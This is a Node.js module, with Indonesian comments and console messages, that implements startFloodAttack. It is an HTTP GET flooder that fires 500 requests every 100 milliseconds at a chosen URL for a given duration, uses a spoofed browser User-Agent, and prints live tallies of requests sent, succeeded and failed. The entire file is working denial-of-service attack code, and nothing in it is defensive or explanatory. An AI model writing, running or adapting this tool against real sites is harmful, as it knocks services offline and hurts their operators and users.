const https = require('https');
const http = require('http');
const { URL } = require('url');

function startFloodAttack(target, duration) {
    if (!target || isNaN(parseInt(duration))) {
        console.log('Invalid Usage: startFloodAttack(target, duration)');
        return false;
    }

    const parsed = new URL(target);
    const protocol = parsed.protocol === 'https:' ? https : http;

    let totalSent = 0;
    let successCount = 0;
    let failCount = 0;

    const attackInterval = setInterval(() => {
        for (let i = 0; i < 500; i++) { // tingkatkan jumlah serangan
            const req = protocol.request({
                method: 'GET',
                hostname: parsed.hostname,
                path: parsed.pathname,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                headers: {
                    'User-Agent': 'Mozilla/5.0',
                    'Connection': 'keep-alive'
                }
            }, res => {
                totalSent++;
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    successCount++;
                } else {
                    failCount++;
                }
            });

            req.on('error', () => {
                totalSent++;
                failCount++;
            });

            req.end();
        }
    }, 100); // 100ms loop

    const statInterval = setInterval(() => {
        console.clear();
        console.log(`Target: ${target}`);
        console.log(`Durasi: ${duration}s`);
        console.log(`Terkirim  : ${totalSent}`);
        console.log(`Berhasil  : ${successCount}`);
        console.log(`Gagal     : ${failCount}`);
    }, 1000);

    setTimeout(() => {
        clearInterval(attackInterval);
        clearInterval(statInterval);
        console.log("\nSerangan selesai!");
        console.log(`Total terkirim : ${totalSent}`);
        console.log(`Berhasil       : ${successCount}`);
        console.log(`Gagal          : ${failCount}`);
    }, duration * 1000);

    return {
        stop: () => {
            clearInterval(attackInterval);
            clearInterval(statInterval);
            console.log('Attack stopped manually');
        }
    };
}

module.exports = { startFloodAttack };